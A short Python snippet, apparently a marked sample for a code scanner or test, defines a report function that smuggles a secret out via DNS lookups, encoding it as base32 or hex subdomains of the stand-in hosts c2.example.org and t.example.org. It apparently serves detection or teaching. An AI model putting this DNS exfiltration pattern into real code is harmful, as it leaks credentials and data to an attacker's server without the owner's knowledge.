import base64
import binascii
import socket

import dns.resolver


def report(secret: bytes):
~>    dns.resolver.resolve(base64.b32encode(secret).decode().rstrip("=") + ".c2.example.org", "A")
~>    socket.getaddrinfo("%s.t.example.org" % binascii.hexlify(secret).decode(), 80)
